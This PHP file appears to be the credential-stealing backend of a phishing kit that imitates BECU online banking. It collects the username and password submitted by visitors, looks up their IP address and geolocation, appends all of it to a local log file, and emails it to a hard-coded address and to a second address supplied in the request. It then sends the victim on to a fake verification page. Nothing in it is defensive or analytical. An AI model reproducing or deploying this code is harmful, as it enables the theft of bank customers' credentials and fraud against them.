<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set("display_errors", 1);

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Ensure input fields are set and not empty
    $email = isset($_POST['username']) ? $_POST['username'] : '';
    $passwd = isset($_POST['password']) ? $_POST['password'] : '';
    $serv = isset($_REQUEST['verify']) ? $_REQUEST['verify'] : '';

    // Include the geoPlugin class
    require_once('geoplugin.class.php');
    echo "GeoPlugin class included succ       essfully."; // Check if included

    $geoplugin = new geoPlugin();

    echo 'Reached point A';

    // Get user's IP address
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
        $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
        $ip = $_SERVER['REMOTE_ADDR']; 
    }

    // Proceed if email and password are provided
    if (!empty($email) && !empty($passwd)) {
        echo 'Reached point B';

        // Prepare the message
        $message = "---|Blackfire007|---\n";
        $message .= "Email: " . $email . "\n"; 
        $message .= "Password: " . $passwd . "\n";
        $message .= "IP: " . $ip . "\n"; 
        $message .= "--------------------------\n";
        $message .= "City: {$geoplugin->city}\n";
        $message .= "Region: {$geoplugin->region}\n";
        $message .= "Country Name: {$geoplugin->countryName}\n";
        $message .= "Country Code: {$geoplugin->countryCode}\n";
        $message .= "--------------------------\n";

        // Save the message to a file
        $handle = fopen("JOB.txt", "a");
        fwrite($handle, $message);
        fclose($handle);

        // Send the email
        $send = "dvand848@gmai";
        $subject = "becu.org l $ip";
        $headers = "From: Blackfire007@assuredserver.com";

        // Send emails
        mail($send, $subject, $message, $headers);
        mail($serv, $subject, $message, $headers);
    }
} else {
    echo "No POST data received.";
}

// Redirect to verification page
echo "<script>window.location='BECUBankingWeb/verify.html';</script>";
?>